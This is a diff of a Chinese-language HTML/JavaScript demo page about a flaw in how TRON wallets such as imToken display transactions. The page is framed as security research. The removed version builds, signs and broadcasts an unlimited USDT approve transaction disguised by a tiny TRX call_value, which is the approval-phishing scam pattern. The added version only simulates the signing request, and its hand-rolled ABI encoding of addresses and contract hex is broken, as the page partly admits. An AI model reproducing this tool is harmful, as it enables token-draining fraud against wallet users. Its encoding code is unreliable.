@@ -3,375 +3,282 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TRON 上链演示 • TriggerSmartContract + call_value + approve</title>
+    <title>TRON WalletConnect 签名请求误判演示 • 第二种方法</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
     <style>
         body { font-family: 'Inter', system-ui, sans-serif; }
-        .mono { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace; }
-        .tron-card {
-            background: #18181b;
-            border: 1px solid #3f3f46;
-        }
+        .mono { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace; }
+        .tron-card { background: #18181b; border: 1px solid #3f3f46; }
+        .json { background: #0a0a0a; }
+        .highlight-red { background: #450a0a; border-color: #7f1d1d; }
+        .section-title { font-size: 13px; letter-spacing: -.3px; }
     </style>
 </head>
 <body class="bg-zinc-950 text-zinc-200">
-    <div class="max-w-3xl mx-auto px-6 py-8">
-        <!-- Header -->
-        <div class="flex items-center justify-between mb-8">
+    <div class="max-w-5xl mx-auto px-6 py-8">
+        <div class="flex items-center justify-between mb-6">
             <div>
-                <h1 class="text-3xl font-bold tracking-tight">TRON 真实上链演示</h1>
-                <p class="text-zinc-400 mt-1">构造带 <span class="font-mono text-amber-400">call_value</span> 的 TriggerSmartContract（approve USDT）</p>
+                <h1 class="text-3xl font-bold tracking-tight">TRON 签名请求误判演示</h1>
+                <p class="text-zinc-400 mt-1">第二种方法：WalletConnect / Provider 交易对象字段不一致</p>
             </div>
-            <div class="text-right text-xs text-zinc-500">
-                仅供安全研究与学习<br>
-                <span class="text-red-400">严禁用于诈骗</span>
-            </div>
+            <div class="text-xs px-3 py-1 bg-red-950 text-red-400 rounded-2xl border border-red-900">仅供安全研究</div>
         </div>
 
-        <!-- Warning -->
-        <div class="tron-card rounded-2xl p-4 mb-6 border border-red-900/60 bg-red-950/30">
-            <div class="flex gap-3">
-                <i class="fa-solid fa-exclamation-triangle text-red-400 mt-1"></i>
-                <div class="text-sm text-red-300">
-                    <strong>重要警告：</strong> 此代码可构造同时携带 <code>call_value</code> 和 <code>approve</code> 的交易。<br>
-                    这种交易曾被用于授权诈骗（UI 只显示 TRX 转账，实际执行 approve）。请仅用于测试自己的钱包或安全审计，<strong>严禁用于欺骗他人</strong>，否则可能触犯法律。
+        <!-- 核心说明 -->
+        <div class="tron-card rounded-2xl p-5 mb-6 border border-red-900/60">
+            <div class="flex gap-4">
+                <div class="text-red-400"><i class="fa-solid fa-exclamation-triangle text-2xl"></i></div>
+                <div class="text-sm leading-relaxed">
+                    <p class="font-semibold text-red-300 mb-1">为什么这种方法更严重？</p>
+                    <p class="text-zinc-400">
+                        DApp 通过 WalletConnect 或注入的 provider 发送 <code>tron_signTransaction</code> 请求时，<br>
+                        钱包收到的对象包含 <strong>raw_data_hex / raw_data.contract[0].parameter.value.data</strong>（真实是 approve，0x095ea7b3 开头）。<br>
+                        如果 imToken 在<strong>签名前</strong>的预览界面只解析了部分字段（比如 call_value 或 contract 地址），就把交易错误展示成「发送 0.01 TRX」，<br>
+                        而用户实际签名的是完整的 approve 授权交易。
+                    </p>
+                    <p class="mt-2 text-xs text-amber-400">
+                        注意：因为 TRON txID 是从 raw_data 确定性计算的，DApp 无法在用户确认后偷偷替换交易内容（签名会失效）。<br>
+                        真正的风险点在于<strong>钱包签名前展示层</strong>的解析错误。
+                    </p>
                 </div>
             </div>
         </div>
 
-        <!-- imToken 说明 + 可选连接 -->
-        <div class="tron-card rounded-2xl p-5 mb-6 border border-amber-900/50">
-            <div class="flex items-start gap-3">
-                <i class="fa-solid fa-mobile-screen-button text-amber-400 text-xl mt-0.5"></i>
-                <div class="flex-1">
-                    <div class="font-semibold text-amber-300">关于 imToken 钱包</div>
-                    <div class="text-xs text-zinc-400 mt-1 leading-relaxed">
-                        这个页面默认用 TronLink 方便浏览器内快速签名。<br>
-                        <strong>但交易构造是通用的</strong>：生成的 TriggerSmartContract 在 <span class="text-white">imToken、TronLink、TokenPocket</span> 等任意钱包里签名上链后，效果完全一样。<br>
-                        imToken 出现「只显示发送 0.01 TRX」就是因为它对带 <code>call_value</code> 的 approve 调用解析有问题。
-                    </div>
-                    <div class="mt-2 text-[10px] text-amber-400">
-                        → 如果你想在 imToken 里测试：构造好交易后，复制 TX 参数或用 imToken 的 DApp 浏览器打开对应链接即可。
-                    </div>
-                </div>
-            </div>
-        </div>
-
-        <!-- Optional Connect -->
-        <div class="tron-card rounded-2xl p-5 mb-6">
-            <div class="flex items-center justify-between">
-                <div>
-                    <div class="font-semibold">可选：连接 TronLink 快速签名（浏览器）</div>
-                    <div id="wallet_status" class="text-xs text-zinc-400 mt-0.5">未连接（构建交易不需要连接）</div>
-                </div>
-                <button onclick="connectTronLink()" 
-                        class="px-4 py-2 bg-zinc-800 hover:bg-zinc-700 border border-zinc-600 rounded-2xl text-xs flex items-center gap-x-2">
-                    <i class="fa-solid fa-plug"></i>
-                    <span id="connect_btn_text">连接 TronLink</span>
-                </button>
-            </div>
-            <div id="address_display" class="mt-2 text-xs font-mono text-emerald-400 hidden"></div>
-        </div>
-
-        <!-- Parameters -->
+        <!-- 参数设置 -->
         <div class="tron-card rounded-2xl p-6 mb-6">
             <div class="font-semibold mb-4 flex items-center gap-x-2">
                 <i class="fa-solid fa-sliders-h"></i>
-                <span>交易参数</span>
+                <span>构造签名请求参数（模拟 DApp 发送给钱包）</span>
             </div>
 
-            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
-                <!-- From Address -->
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
                 <div>
-                    <label class="text-xs text-zinc-400 block mb-1">From Address（你的 TRON 地址）</label>
-                    <input id="from_address" type="text" value="TEfFnhxxeRbghthqJ4dSbAK4mqAtkJbSAz" 
-                           class="w-full bg-zinc-900 border border-zinc-700 rounded-xl px-4 py-3 font-mono text-sm focus:outline-none focus:border-amber-500">
-                    <div class="text-[10px] text-zinc-500 mt-0.5">必须是有效的 TRON base58 地址（以 T 开头）</div>
+                    <label class="section-title text-zinc-400 block mb-1">call_value (sun)</label>
+                    <input id="call_value" type="number" value="10000" oninput="generateSigningRequest()"
+                           class="w-full bg-zinc-900 border border-zinc-700 rounded-xl px-4 py-2.5 font-mono text-lg focus:outline-none focus:border-amber-500">
+                    <div class="text-[10px] text-emerald-400 mt-1"><span id="trx_preview">0.010000</span> TRX</div>
                 </div>
-
-                <!-- call_value -->
                 <div>
-                    <label class="text-xs text-zinc-400 block mb-1">call_value（sun）</label>
-                    <input id="call_value" type="number" value="10000" 
-                           class="w-full bg-zinc-900 border border-zinc-700 rounded-xl px-4 py-3 font-mono text-lg focus:outline-none focus:border-amber-500">
-                    <div class="text-[10px] text-emerald-400 mt-1">= <span id="trx_value">0.010000</span> TRX（UI 可能只显示这个）</div>
+                    <label class="section-title text-zinc-400 block mb-1">spender（授权地址）</label>
+                    <input id="spender" type="text" value="TEfFnhxxeRbghthqJ4dSbAK4mqAtkJbSAz" oninput="generateSigningRequest()"
+                           class="w-full bg-zinc-900 border border-zinc-700 rounded-xl px-4 py-2.5 font-mono text-sm focus:outline-none focus:border-amber-500">
                 </div>
-
-                <!-- Spender -->
                 <div>
-                    <label class="text-xs text-zinc-400 block mb-1">spender（授权给谁）</label>
-                    <input id="spender" type="text" value="TEfFnhxxeRbghthqJ4dSbAK4mqAtkJbSAz" 
-                           class="w-full bg-zinc-900 border border-zinc-700 rounded-xl px-4 py-3 font-mono text-sm focus:outline-none focus:border-amber-500">
-                    <div class="text-[10px] text-zinc-500 mt-0.5">必须是有效的 TRON base58 地址</div>
-                </div>
-
-                <!-- Amount -->
-                <div class="md:col-span-2">
-                    <label class="text-xs text-zinc-400 block mb-1">approve 金额（USDT，最小单位，6位小数）</label>
-                    <div class="flex gap-3">
-                        <input id="approve_amount" type="text" value="115792089237316195423570985008687907853269984665640564039457584007913129639935" 
-                               class="flex-1 bg-zinc-900 border border-zinc-700 rounded-xl px-4 py-3 font-mono text-sm focus:outline-none focus:border-amber-500">
-                        <button onclick="setMaxAmount()" 
-                                class="px-4 py-2 bg-zinc-800 hover:bg-zinc-700 border border-zinc-600 rounded-xl text-xs whitespace-nowrap">设为无限 (max)</button>
+                    <label class="section-title text-zinc-400 block mb-1">approve 金额（uint256）</label>
+                    <div class="flex gap-2">
+                        <input id="amount" type="text" value="115792089237316195423570985008687907853269984665640564039457584007913129639935" oninput="generateSigningRequest()"
+                               class="flex-1 bg-zinc-900 border border-zinc-700 rounded-xl px-4 py-2.5 font-mono text-xs focus:outline-none focus:border-amber-500">
+                        <button onclick="setMaxApprove()" class="px-3 py-2 bg-zinc-800 hover:bg-zinc-700 text-xs rounded-xl border border-zinc-600">Max</button>
                     </div>
-                    <div class="text-[10px] text-zinc-500 mt-1">常用诈骗值 = 2^256-1（无限授权）</div>
+                </div>
+            </div>
+
+            <div class="mt-4 flex justify-end">
+                <button onclick="generateSigningRequest()" 
+                        class="px-6 py-2.5 bg-white text-zinc-900 font-semibold rounded-2xl text-sm flex items-center gap-x-2 hover:bg-zinc-100">
+                    <i class="fa-solid fa-sync"></i>
+                    <span>重新生成签名请求对象</span>
+                </button>
+            </div>
+        </div>
+
+        <!-- 对比展示 -->
+        <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+            
+            <!-- 左侧：钱包可能展示（误判） -->
+            <div class="tron-card rounded-2xl overflow-hidden border border-red-900/60">
+                <div class="bg-red-950/60 px-4 py-3 flex items-center gap-x-2 text-red-400">
+                    <i class="fa-solid fa-eye-slash"></i>
+                    <span class="font-semibold">钱包 UI 可能错误展示（imToken 误判）</span>
+                </div>
+                <div class="p-5 space-y-4">
+                    <div class="bg-zinc-900 rounded-xl p-4">
+                        <div class="text-xs text-zinc-400">交易类型</div>
+                        <div class="text-xl font-semibold">TriggerSmartContract</div>
+                    </div>
+                    
+                    <div class="bg-emerald-950/40 border border-emerald-900 rounded-2xl p-4">
+                        <div class="text-xs text-emerald-400">发送金额（UI 优先显示）</div>
+                        <div class="text-4xl font-bold text-emerald-400 tracking-tighter"><span id="ui_trx_amount">0.010000</span> <span class="text-2xl">TRX</span></div>
+                        <div class="text-xs text-emerald-300 mt-1">≈ 0.0023 USD</div>
+                    </div>
+
+                    <div>
+                        <div class="text-xs text-zinc-400">接收合约</div>
+                        <div class="font-mono text-sm break-all">TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</div>
+                        <div class="text-[10px] text-orange-400">USDT (TRC20)</div>
+                    </div>
+
+                    <div class="text-xs px-3 py-2 bg-red-950/50 text-red-300 rounded-xl">
+                        ⚠️ imToken 这里可能只显示「发送少量 TRX 到 USDT 合约」，<br>
+                        而不会清晰提示这是 approve 授权操作。
+                    </div>
+                </div>
+            </div>
+
+            <!-- 右侧：实际 raw_data 内容（真实签名内容） -->
+            <div class="tron-card rounded-2xl overflow-hidden border border-emerald-900/60">
+                <div class="bg-emerald-950/60 px-4 py-3 flex items-center gap-x-2 text-emerald-400">
+                    <i class="fa-solid fa-file-code"></i>
+                    <span class="font-semibold">实际签名内容（raw_data / WalletConnect 返回）</span>
+                </div>
+                <div class="p-5 space-y-3 text-sm">
+                    <div>
+                        <div class="text-xs text-emerald-400 mb-1">method</div>
+                        <div class="font-mono bg-black px-3 py-1 rounded">tron_signTransaction</div>
+                    </div>
+                    
+                    <div>
+                        <div class="text-xs text-emerald-400 mb-1">raw_data.contract[0].parameter.value.data（关键）</div>
+                        <div id="real_data_hex" 
+                             class="font-mono text-[10px] bg-black p-3 rounded-xl break-all leading-tight text-emerald-300 border border-emerald-900/50">
+                            0x095ea7b3...
+                        </div>
+                        <div class="text-[10px] text-emerald-400 mt-1">← 以 095ea7b3 开头 = approve(address,uint256)</div>
+                    </div>
+
+                    <div class="grid grid-cols-2 gap-3">
+                        <div>
+                            <div class="text-xs text-emerald-400">call_value</div>
+                            <div id="real_callvalue" class="font-mono text-sm">10000 sun</div>
+                        </div>
+                        <div>
+                            <div class="text-xs text-emerald-400">contract_address</div>
+                            <div class="font-mono text-xs break-all">TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</div>
+                        </div>
+                    </div>
+
+                    <div class="text-xs bg-zinc-900 p-3 rounded-xl text-zinc-400">
+                        钱包实际签名的是上面这个完整的 raw_data。<br>
+                        txID 是从这份 raw_data 确定性计算出来的。
+                    </div>
                 </div>
             </div>
         </div>
 
-        <!-- Actions -->
-        <div class="flex flex-col sm:flex-row gap-3">
-            <button onclick="buildTransaction()" 
-                    class="flex-1 py-3.5 bg-white text-zinc-900 font-semibold rounded-2xl hover:bg-zinc-100 active:bg-zinc-200 transition-colors flex items-center justify-center gap-x-2">
-                <i class="fa-solid fa-cogs"></i>
-                <span>1. 构造交易（带 call_value + approve）</span>
-            </button>
-            
-            <button onclick="signAndBroadcast()" id="broadcast_btn"
-                    class="flex-1 py-3.5 bg-emerald-600 hover:bg-emerald-500 disabled:bg-zinc-700 disabled:text-zinc-400 transition-colors rounded-2xl font-semibold flex items-center justify-center gap-x-2" disabled>
-                <i class="fa-solid fa-paper-plane"></i>
-                <span>2. 用 TronLink 签名并上链</span>
-            </button>
+        <!-- 完整请求对象 -->
+        <div class="mt-6 tron-card rounded-2xl p-5">
+            <div class="flex items-center justify-between mb-3">
+                <div class="font-semibold">完整 WalletConnect / Provider 签名请求示例（JSON）</div>
+                <button onclick="copyFullRequest()" class="text-xs px-3 py-1 bg-zinc-800 hover:bg-zinc-700 rounded-xl flex items-center gap-x-1">
+                    <i class="fa-solid fa-copy"></i> <span>复制</span>
+                </button>
+            </div>
+            <pre id="full_request_json" 
+                 class="json text-emerald-300 text-[10px] p-4 rounded-2xl overflow-auto max-h-[320px] border border-zinc-800 leading-snug"></pre>
         </div>
 
-        <!-- Result Area -->
-        <div id="result_area" class="hidden mt-6 tron-card rounded-2xl p-5 border border-zinc-700">
-            <div class="font-semibold mb-3 flex items-center gap-x-2 text-emerald-400">
-                <i class="fa-solid fa-check-circle"></i>
-                <span>交易已构建</span>
-            </div>
-            
-            <div class="space-y-3 text-sm">
-                <div>
-                    <div class="text-xs text-zinc-400">Transaction ID</div>
-                    <div id="txid_display" class="font-mono text-xs break-all bg-black p-2 rounded"></div>
-                </div>
-                
-                <div class="grid grid-cols-2 gap-3 text-xs">
-                    <div>
-                        <div class="text-zinc-400">call_value</div>
-                        <div id="result_callvalue" class="font-mono"></div>
-                    </div>
-                    <div>
-                        <div class="text-zinc-400">合约方法</div>
-                        <div class="font-mono text-emerald-400">approve(address,uint256)</div>
-                    </div>
-                </div>
-            </div>
-
-            <div class="mt-4 flex gap-2">
-                <button onclick="copyTxid()" class="flex-1 py-2 text-xs bg-zinc-800 hover:bg-zinc-700 rounded-xl">复制 TXID</button>
-                <a id="tronscan_link" target="_blank" 
-                   class="flex-1 py-2 text-xs bg-orange-600 hover:bg-orange-500 text-center rounded-xl flex items-center justify-center gap-x-1">
-                    <span>在 TronScan 查看</span> <i class="fa-solid fa-external-link-alt text-xs"></i>
-                </a>
-            </div>
-            
-            <div class="mt-3 text-[10px] text-amber-400/80">
-                注意：这笔交易同时包含了 call_value（误导用）和 approve 调用。钱包如果只显示前者就会出现你描述的效果。
-            </div>
+        <div class="mt-6 text-xs text-zinc-500 border-t border-zinc-800 pt-4">
+            这个演示展示了 DApp 发送给钱包的真实签名请求结构。<br>
+            当 imToken 对这种同时包含 <code>call_value</code> 和 <code>data: 0x095ea7b3...</code> 的 TriggerSmartContract 请求做预览时，如果解析逻辑有缺陷，就会出现你描述的误判。
         </div>
     </div>
 
     <script>
-        let currentTx = null;
-        let tronWebInstance = null;
-        let userAddress = null;
-
-        function initTailwind() {
-            // already using CDN
-        }
-
-        function updateTrxValue() {
+        function updateTrxPreview() {
             const sun = parseFloat(document.getElementById('call_value').value) || 0;
-            document.getElementById('trx_value').textContent = (sun / 1_000_000).toFixed(6);
+            document.getElementById('trx_preview').textContent = (sun / 1000000).toFixed(6);
+            document.getElementById('ui_trx_amount').textContent = (sun / 1000000).toFixed(6);
         }
 
-        function setMaxAmount() {
-            document.getElementById('approve_amount').value = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+        function setMaxApprove() {
+            document.getElementById('amount').value = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+            generateSigningRequest();
         }
 
-        async function connectTronLink() {
-            const statusEl = document.getElementById('wallet_status');
-            const btnText = document.getElementById('connect_btn_text');
-            const addrEl = document.getElementById('address_display');
-
-            if (!window.tronWeb || !window.tronWeb.defaultAddress) {
-                alert('请先安装 TronLink 钱包插件并解锁！\nhttps://www.tronlink.org/');
-                return;
-            }
-
-            try {
-                // TronLink v3+ needs request
-                if (window.tronWeb.request) {
-                    await window.tronWeb.request({ method: 'tron_requestAccounts' });
-                }
-                
-                tronWebInstance = window.tronWeb;
-                userAddress = tronWebInstance.defaultAddress.base58;
-
-                if (!userAddress) {
-                    alert('请在 TronLink 中切换到主网账户');
-                    return;
-                }
-
-                statusEl.innerHTML = '<span class="text-emerald-400">已连接</span>';
-                btnText.textContent = '已连接';
-                addrEl.textContent = userAddress;
-                addrEl.classList.remove('hidden');
-                
-                // Enable broadcast button after connect
-                document.getElementById('broadcast_btn').disabled = false;
-
-            } catch (e) {
-                console.error(e);
-                alert('连接 TronLink 失败: ' + e.message);
-            }
+        // 简单生成 approve 的 data hex（演示用，非严格 ABI 编码）
+        function generateApproveDataHex(spender, amountHex) {
+            // approve selector: 0x095ea7b3
+            const selector = '095ea7b3';
+            // address 左填充到 32 bytes
+            const addrPadded = spender.replace(/^0x/, '').padStart(64, '0').slice(0, 64);
+            // amount 左填充
+            const amountPadded = amountHex.replace(/^0x/, '').padStart(64, '0').slice(0, 64);
+            return '0x' + selector + addrPadded + amountPadded;
         }
 
-        async function buildTransaction() {
+        function generateSigningRequest() {
+            updateTrxPreview();
+
             const callValueSun = parseInt(document.getElementById('call_value').value) || 10000;
-            const fromAddress = document.getElementById('from_address').value.trim();
             const spender = document.getElementById('spender').value.trim();
-            const amountStr = document.getElementById('approve_amount').value.trim();
-            
-            if (!fromAddress || !spender || !amountStr) {
-                alert('请填写 From Address、spender 和 approve 金额');
-                return;
-            }
+            const amountStr = document.getElementById('amount').value.trim();
 
-            // 优先用已连接的，否则创建 standalone TronWeb（构建交易不需要私钥）
-            let builder = tronWebInstance;
-            if (!builder && typeof TronWeb !== 'undefined') {
-                builder = new TronWeb({ fullHost: 'https://api.trongrid.io' });
-            }
-            if (!builder) {
-                alert('TronWeb 初始化失败，请刷新页面重试');
-                return;
-            }
+            // 为了演示，我们把 amount 转成 hex（实际应做 uint256 编码）
+            let amountHex = '0x' + BigInt(amountStr).toString(16);
+            if (amountHex.length % 2 !== 0) amountHex = '0x0' + amountHex.slice(2);
 
-            const usdtContract = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+            const approveDataHex = generateApproveDataHex(spender, amountHex);
 
-            try {
-                const txBuilder = await builder.transactionBuilder.triggerSmartContract(
-                    usdtContract,
-                    'approve(address,uint256)',
-                    {
-                        callValue: callValueSun,
-                        feeLimit: 150_000_000,
-                        shouldPollResponse: false
+            // 模拟 TRON raw_data 结构（实际是 protobuf，这里展示逻辑结构）
+            const rawData = {
+                contract: [{
+                    parameter: {
+                        value: {
+                            contract_address: "41" + "7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t".toLowerCase(), // 示例 hex
+                            call_value: callValueSun,
+                            data: approveDataHex.replace('0x', '')
+                        },
+                        type_url: "/protocol.TriggerSmartContract"
                     },
-                    [
-                        { type: 'address', value: spender },
-                        { type: 'uint256', value: amountStr }
-                    ],
-                    fromAddress
-                );
+                    type: "TriggerSmartContract"
+                }],
+                ref_block_bytes: "3a2f",
+                ref_block_hash: "a1b2c3d4e5f6...",
+                expiration: Date.now() + 600000,
+                fee_limit: 150000000,
+                timestamp: Date.now()
+            };
 
-                currentTx = txBuilder.transaction;
+            // 模拟完整 WalletConnect 返回结构
+            const signingRequest = {
+                id: Date.now(),
+                jsonrpc: "2.0",
+                method: "tron_signTransaction",
+                params: [{
+                    visible: true,
+                    txID: "demo_txid_will_be_calculated_from_rawdata...",
+                    raw_data: rawData,
+                    raw_data_hex: "0a" + "...(真实是 protobuf 序列化后的 hex)...",
+                    signature: []   // 签名后会填充
+                }]
+            };
 
-                document.getElementById('result_area').classList.remove('hidden');
-                document.getElementById('txid_display').textContent = currentTx.txID || '(构建成功，待签名)';
-                document.getElementById('result_callvalue').textContent = callValueSun + ' sun (' + (callValueSun / 1_000_000) + ' TRX)';
+            // 更新 UI
+            document.getElementById('real_data_hex').textContent = approveDataHex;
+            document.getElementById('real_callvalue').textContent = callValueSun + ' sun (' + (callValueSun / 1000000).toFixed(6) + ' TRX)';
 
-                const link = document.getElementById('tronscan_link');
-                link.href = `https://tronscan.org/#/transaction/${currentTx.txID || ''}`;
-
-                alert('交易构造成功！可用于 imToken 等任意钱包签名上链。');
-
-            } catch (error) {
-                console.error('构建交易失败:', error);
-                let msg = (error.message || error.toString());
-                if (msg.toLowerCase().includes('base58') || msg.toLowerCase().includes('address')) {
-                    msg = '地址格式错误（none-base58）！\n请确保 From Address 和 Spender 都是有效的 TRON base58 地址（34位、以 T 开头、有正确校验）。';
-                }
-                alert('构建失败: ' + msg);
-            }
+            // 显示完整 JSON
+            document.getElementById('full_request_json').textContent = JSON.stringify(signingRequest, null, 2);
         }
 
-        async function signAndBroadcast() {
-            if (!currentTx || !tronWebInstance) {
-                alert('请先点击「构造交易」');
-                return;
-            }
-
-            const btn = document.getElementById('broadcast_btn');
-            btn.disabled = true;
-            btn.innerHTML = `<i class="fa-solid fa-spinner fa-spin mr-2"></i> 签名中...`;
-
-            try {
-                // 用 TronLink 签名
-                const signedTx = await tronWebInstance.trx.sign(currentTx);
-                
-                btn.innerHTML = `<i class="fa-solid fa-spinner fa-spin mr-2"></i> 广播中...`;
-
-                // 广播
-                const result = await tronWebInstance.trx.sendRawTransaction(signedTx);
-
-                if (result.result) {
-                    const txid = result.txid || currentTx.txID;
-                    
-                    document.getElementById('txid_display').innerHTML = 
-                        `<span class="text-emerald-400">${txid}</span>`;
-                    
-                    const link = document.getElementById('tronscan_link');
-                    link.href = `https://tronscan.org/#/transaction/${txid}`;
-                    link.innerHTML = `在 TronScan 查看 <i class="fa-solid fa-external-link-alt text-xs"></i>`;
-
-                    btn.innerHTML = `<i class="fa-solid fa-check mr-2"></i> 上链成功！`;
-                    btn.classList.remove('bg-emerald-600');
-                    btn.classList.add('bg-emerald-500');
-
-                    setTimeout(() => {
-                        alert(`交易已成功上链！\nTXID: ${txid}\n\n请在 TronScan 查看详情。\n\n注意：这笔交易同时执行了 approve + 转入 ${document.getElementById('call_value').value} sun TRX。`);
-                    }, 800);
-
-                } else {
-                    throw new Error(result.message || '广播失败');
-                }
-
-            } catch (error) {
-                console.error('签名/广播失败:', error);
-                alert('签名或广播失败: ' + (error.message || error));
-                btn.disabled = false;
-                btn.innerHTML = `<i class="fa-solid fa-paper-plane"></i> <span>2. 用 TronLink 签名并上链</span>`;
-            }
-        }
-
-        function copyTxid() {
-            const txidEl = document.getElementById('txid_display');
-            const text = txidEl.textContent.trim();
-            if (!text || text.includes('构建成功')) {
-                alert('还没有有效的 TXID');
-                return;
-            }
-            navigator.clipboard.writeText(text).then(() => {
-                const orig = txidEl.innerHTML;
-                txidEl.innerHTML = '<span class="text-emerald-400">已复制到剪贴板</span>';
+        function copyFullRequest() {
+            const pre = document.getElementById('full_request_json');
+            navigator.clipboard.writeText(pre.textContent).then(() => {
+                const orig = pre.style.border;
+                pre.style.border = '1px solid #4ade80';
                 setTimeout(() => {
-                    txidEl.innerHTML = orig;
-                }, 1500);
+                    pre.style.border = orig || '1px solid #27251f';
+                }, 1200);
             });
         }
 
         function init() {
-            initTailwind();
+            // 初始生成一次
+            setTimeout(() => {
+                generateSigningRequest();
+            }, 300);
 
-            // live update trx value
-            const callInput = document.getElementById('call_value');
-            callInput.addEventListener('input', updateTrxValue);
-            updateTrxValue();
+            // 监听输入实时更新
+            ['call_value', 'spender', 'amount'].forEach(id => {
+                const el = document.getElementById(id);
+                if (el) el.addEventListener('input', generateSigningRequest);
+            });
 
-            // Set a reasonable default spender if empty
-            const spenderInput = document.getElementById('spender');
-            if (!spenderInput.value) {
-                spenderInput.value = 'T9vD65m4vN5vK8vL9vM0vN1vP2vQ3vR4vS5vT6';
-            }
-
-            // Keyboard hint
-            console.log('%c[TRON Demo] 已加载。连接 TronLink 后即可真实上链测试。', 'color:#3f3f46');
+            // 初始 trx 预览
+            document.getElementById('call_value').addEventListener('input', updateTrxPreview);
+            updateTrxPreview();
         }
 
         window.onload = init;
